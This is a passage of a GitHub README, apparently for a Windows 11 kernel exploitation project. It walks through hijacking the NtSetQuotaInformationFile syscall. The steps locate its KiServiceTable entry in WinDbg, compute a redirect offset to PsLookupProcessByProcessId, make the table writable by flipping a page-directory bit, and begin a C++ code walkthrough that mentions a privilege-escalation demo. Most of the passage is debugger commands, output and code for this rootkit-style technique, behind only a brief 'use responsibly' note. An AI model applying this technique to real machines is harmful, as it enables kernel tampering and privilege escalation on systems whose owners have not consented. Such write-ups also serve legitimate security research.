+<div class="markdown-heading" dir="auto"><h5 tabindex="-1" class="heading-element" dir="auto">Extracting the Syscall Number</h5><a id="user-content-extracting-the-syscall-number" class="anchor" aria-label="Permalink: Extracting the Syscall Number" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#extracting-the-syscall-number"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">To find the syscall number of <code>NtSetQuotaInformationFile</code>, open <code>ntdll.dll</code> (located in <code>C:\WINDOWS\SYSTEM32</code>) using <strong>IDA Pro</strong> or another disassembler.</p>
+<p dir="auto">From the disassembly:</p>
+<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/blob/main/screenshots/NtSetQuotaInformationFile.png"><img src="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/raw/main/screenshots/NtSetQuotaInformationFile.png" alt="NtSetQuotaInformationFile" style="max-width: 100%;"></a>
+<a target="_blank" rel="noopener noreferrer" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/blob/main/screenshots/syscall_number.png"><img src="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack/raw/main/screenshots/syscall_number.png" alt="Syscall Number" style="max-width: 100%;"></a></p>
+<p dir="auto">We can see that the <strong>syscall number is <code>0x1B8</code></strong> (440 in decimal).</p>
+<hr>
+<div class="markdown-heading" dir="auto"><h5 tabindex="-1" class="heading-element" dir="auto">Understanding <code>nt!KiServiceTable</code></h5><a id="user-content-understanding-ntkiservicetable" class="anchor" aria-label="Permalink: Understanding nt!KiServiceTable" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#understanding-ntkiservicetable"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">The <code>nt!KiServiceTable</code> is a kernel array of function pointers (each 4 bytes on x64 systems), used by the syscall dispatcher to locate the correct handler.</p>
+<p dir="auto">To get the current pointer for <code>NtSetQuotaInformationFile</code>, multiply the syscall number by 4 and inspect the entry:</p>
+<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto"><pre>2: kd<span class="pl-k">&gt;</span> dds nt<span class="pl-k">!</span>KiServiceTable + 0x04 <span class="pl-k">*</span> 0x1b8 L1
+fffff803<span class="pl-s"><span class="pl-pds">`</span>eb2d9e80  0639c300</span></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="2: kd> dds nt!KiServiceTable + 0x04 * 0x1b8 L1
+fffff803`eb2d9e80  0639c300" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">This value is an offset — to determine where it points, shift it right by 4 bits and add it to the base of the service table:</p>
+<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto"><pre>2: kd<span class="pl-k">&gt;</span> u nt<span class="pl-k">!</span>KiServiceTable + (0639c300 <span class="pl-k">&gt;&gt;</span> 4) L4
+nt<span class="pl-k">!</span>NtSetQuotaInformationFile:
+fffff803<span class="pl-s"><span class="pl-pds">`</span>eb9133d0 4883ec38        sub     rsp,38h</span>
+<span class="pl-s">fffff803<span class="pl-pds">`</span></span>eb9133d4 e837a6ffff      call    nt<span class="pl-k">!</span>IopSetEaOrQuotaInformationFile
+fffff803<span class="pl-s"><span class="pl-pds">`</span>eb9133d9 4883c438        add     rsp,38h</span>
+<span class="pl-s">fffff803<span class="pl-pds">`</span></span>eb9133dd c3              ret</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="2: kd> u nt!KiServiceTable + (0639c300 >> 4) L4
+nt!NtSetQuotaInformationFile:
+fffff803`eb9133d0 4883ec38        sub     rsp,38h
+fffff803`eb9133d4 e837a6ffff      call    nt!IopSetEaOrQuotaInformationFile
+fffff803`eb9133d9 4883c438        add     rsp,38h
+fffff803`eb9133dd c3              ret" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">This confirms that the handler for <code>NtSetQuotaInformationFile</code> is indeed located here.</p>
+<hr>
+<div class="markdown-heading" dir="auto"><h5 tabindex="-1" class="heading-element" dir="auto">Redirecting the Syscall to Our Target</h5><a id="user-content-redirecting-the-syscall-to-our-target" class="anchor" aria-label="Permalink: Redirecting the Syscall to Our Target" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#redirecting-the-syscall-to-our-target"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">We want to replace this handler with another kernel routine, for example, <code>nt!PsLookupProcessByProcessId</code>.</p>
+<p dir="auto">First, compute the new offset to use in the <code>KiServiceTable</code> entry:</p>
+<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto"><pre>2: kd<span class="pl-k">&gt;</span> <span class="pl-k">?</span> ( nt<span class="pl-k">!</span>PsLookupProcessByProcessId - nt<span class="pl-k">!</span>KiServiceTable ) <span class="pl-s"><span class="pl-k">&lt;&lt;</span> <span class="pl-k">4</span></span>
+<span class="pl-s">Evaluate expression: 137195520 = 00000000<span class="pl-s"><span class="pl-pds">`</span>082d7000</span></span></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="2: kd> ? ( nt!PsLookupProcessByProcessId - nt!KiServiceTable ) << 4
+Evaluate expression: 137195520 = 00000000`082d7000" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">So the new value to inject at index <code>0x1B8</code> is <code>0x082d7000</code>.</p>
+<hr>
+<div class="markdown-heading" dir="auto"><h5 tabindex="-1" class="heading-element" dir="auto">Bypassing Read-Only Protection</h5><a id="user-content-bypassing-read-only-protection" class="anchor" aria-label="Permalink: Bypassing Read-Only Protection" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#bypassing-read-only-protection"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">Attempting to overwrite the <code>nt!KiServiceTable</code> directly will fail because it is <strong>read-only</strong>:</p>
+<pre>1: kd&gt; !pte nt!KiServiceTable
+                                           VA fffff803eb2d97a0
+PXE at FFFFF67B3D9ECF80    PPE at FFFFF67B3D9F0078    PDE at FFFFF67B3E00FAC8    PTE at FFFFF67C01F596C8
+contains 00000000007F7063  contains 0000000000829063  contains 8A0000011BC001E3  contains 0000000000000000
+pfn 7f7       ---DA--KWEV  pfn 829       ---DA--KWEV  pfn 11bc00    -GLDA--K<mark>R</mark>-V  LARGE PAGE pfn 11bcd9      
+</pre>
+<ul dir="auto">
+<li>The <code>PTE</code> is <strong>not valid (zeroed)</strong> — so protection is governed at the <strong>Page Directory Entry (PDE)</strong> level.</li>
+<li>The PDE flags include <code>R</code> (Read), but <strong>not <code>W</code> (Write)</strong>, making the page <strong>read-only</strong>.</li>
+</ul>
+<blockquote>
+<p dir="auto"><strong>Key Insight</strong>: Since the page table entry is invalid, control of memory access is governed by the PDE. To gain write access, you must <strong>flip the PDE's "Read-only" flag to "Write"</strong>.</p>
+</blockquote>
+<hr>
+<div class="markdown-heading" dir="auto"><h5 tabindex="-1" class="heading-element" dir="auto">Summary</h5><a id="user-content-summary" class="anchor" aria-label="Permalink: Summary" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#summary"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">To hijack <code>NtSetQuotaInformationFile</code>:</p>
+<ol dir="auto">
+<li><strong>Get syscall number</strong> using disassembly (e.g., <code>0x1B8</code>).</li>
+<li><strong>Locate the target function pointer</strong> in <code>nt!KiServiceTable + 4 * 0x1B8</code>.</li>
+<li><strong>Compute the offset</strong> for your replacement function (<code>&lt;&lt; 4</code>).</li>
+<li><strong>Modify the PDE</strong> to make the page writable.</li>
+<li><strong>Overwrite the entry</strong> in the service table with the new offset.</li>
+</ol>
+<blockquote>
+<p dir="auto"><g-emoji class="g-emoji" alias="warning">⚠️</g-emoji> This technique requires <strong>kernel-level privileges</strong> and direct manipulation of memory protection — typically achievable in exploit development or rootkit scenarios. Use responsibly and legally.</p>
+</blockquote>
+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">Code Walkthrough</h3><a id="user-content-code-walkthrough" class="anchor" aria-label="Permalink: Code Walkthrough" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#code-walkthrough"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<blockquote>
+<p dir="auto">ℹ️ The steps below describe the conceptual sequence. In the actual source the work is split into three reusable primitives on <code>kernelHelper</code> — <code>prepareHijack()</code> (steps 1–4), <code>pointSyscallTo(target, stackArgs)</code> (step 5), and <code>restoreHijack()</code> (step 8) — so it can be reused for the <code>/privesc</code> demo and for arbitrary target routines. See <strong>Generalizing the hijack</strong> further down.</p>
+</blockquote>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">1. <strong>Find ntoskrnl Base Address</strong></h4><a id="user-content-1-find-ntoskrnl-base-address" class="anchor" aria-label="Permalink: 1. Find ntoskrnl Base Address" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#1-find-ntoskrnl-base-address"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="highlight highlight-source-c++ notranslate position-relative overflow-auto" dir="auto"><pre><span class="pl-c1">DWORD64</span> nt_base = (<span class="pl-c1">DWORD64</span>)<span class="pl-c1">this</span>-&gt;lpNtosBase;</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="DWORD64 nt_base = (DWORD64)this->lpNtosBase;" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">You obtain the base of the Windows kernel in memory (I am using <code>EnumDeviceDrivers</code> for this).</p>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">2. <strong>Read Address of KiServiceTable</strong></h4><a id="user-content-2-read-address-of-kiservicetable" class="anchor" aria-label="Permalink: 2. Read Address of KiServiceTable" href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#2-read-address-of-kiservicetable"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="highlight highlight-source-c++ notranslate position-relative overflow-auto" dir="auto"><pre><span class="pl-c1">DWORD64</span> nt_KiServiceTable;
+<span class="pl-en">VirtualRead</span>(nt_base + KeServiceDescriptorTableShadow_Offset_fromNT, &amp;nt_KiServiceTable, <span class="pl-k">sizeof</span>(nt_KiServiceTable));</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="DWORD64 nt_KiServiceTable;
+VirtualRead(nt_base + KeServiceDescriptorTableShadow_Offset_fromNT, &amp;nt_KiServiceTable, sizeof(nt_KiServiceTable));" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">You read the hardcoded offset where <code>KiServiceTable</code> lives. This offset must match your target Windows build.</p>
+<p dir="auto">You can get the offset <code>KeServiceDescriptorTableShadow_Offset_fromNT</code> in a local kernel debug session in windbg</p>
+<pre>2: kd&gt; dqs nt!KeServiceDescriptorTableShadow L5
+fffff802`e6bc5280  <mark>fffff802`e5cd97a0 nt!KiServiceTable</mark>
+fffff802`e6bc5288  00000000`00000000
+fffff802`e6bc5290  00000000`000001e9
+fffff802`e6bc5298  fffff802`e5cd9f48 nt!KiArgumentTable
+fffff802`e6bc52a0  fffff802`77dcc000 win32k!W32pServiceTable
+2: kd&gt; ? nt!KeServiceDescriptorTableShadow - nt
+Evaluate expression: 16536192 = <mark>00000000`00fc5280</mark>
+</pre>
+<div class="markdown-heading" dir="auto"><h4 tabindex="-1" class="heading-element" dir="auto">3. <strong>Get PTE (Page Table Entry) Base Address in kernel memory.</strong></h4><a id="user-content-3-get-pte-page-table-entry-base-address-in-kernel-memory" class="anchor" aria-label="Permalink: 3. Get PTE (Page Table Entry) Base Address in kernel memory." href="https://github.com/V-i-x-x/win11-kernel-execution-syscall-hijack#3-get-pte-page-table-entry-base-address-in-kernel-memory"><svg data-component="Octicon" class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">at <code>nt!MiGetPteAddress + 0x13</code> we can get the PTE Base address.</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>dq nt!MiGetPteAddress + 0x13
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy code to clipboard" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="dq nt!MiGetPteAddress + 0x13" tabindex="0" role="button">
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" data-component="Octicon" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
